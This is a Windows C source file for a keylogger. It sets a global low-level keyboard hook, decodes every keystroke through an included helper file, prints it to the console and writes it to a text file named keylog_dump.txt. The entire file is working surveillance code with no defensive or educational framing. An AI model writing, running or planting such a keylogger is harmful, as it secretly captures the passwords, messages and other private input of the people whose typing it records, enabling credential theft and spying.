#include <stdio.h>
#include <windows.h>

// a more human readable output
#define clean true

// log keys to a .txt file
#define dumpInTXTfile true

#include "CaptureKeyPress.cpp"

HHOOK keyboardHook;
FILE* gl_file = NULL;

LRESULT __stdcall KeyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	if(nCode == HC_ACTION) {
		KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)lParam;
		const char* c = CaptureKeyPress(k->vkCode, k->flags);
		if (c != NULL) {
			printf("%s", c);
			
			#if dumpInTXTfile
			fprintf(gl_file, c);
			fflush(gl_file);
			#endif
		}
	}
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

int main() {
    
	// set hook
	if (!(keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, NULL, 0))) { fprintf(stderr, "ERROR: failed to install keyboard hook\n"); }
	
	#if dumpInTXTfile
	gl_file = fopen("keylog_dump.txt", "w");
	if (gl_file == NULL) { fprintf(stderr, "ERROR: failed to open txt file\n"); return 1; }
	#endif
	
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
	
	#if dumpInTXTfile
	fclose(gl_file);
	#endif
	
	// release hook
	UnhookWindowsHookEx(keyboardHook);
	
    return msg.wParam;
}